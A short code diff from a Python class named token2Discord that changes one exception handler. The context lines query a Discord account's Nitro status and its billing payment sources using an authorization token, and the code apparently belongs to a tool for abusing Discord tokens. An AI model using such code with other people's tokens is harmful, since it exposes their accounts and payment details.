@@ -96,7 +96,7 @@ class token2Discord:
                 nitro = 'Nitro Classic'
             elif userData['premium_type'] == 2:
                 nitro = 'Nitro Boost'
-        except BaseException:
+        except Exception:
             pass
 
         billResponse = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers={'Authorization': token}).json()
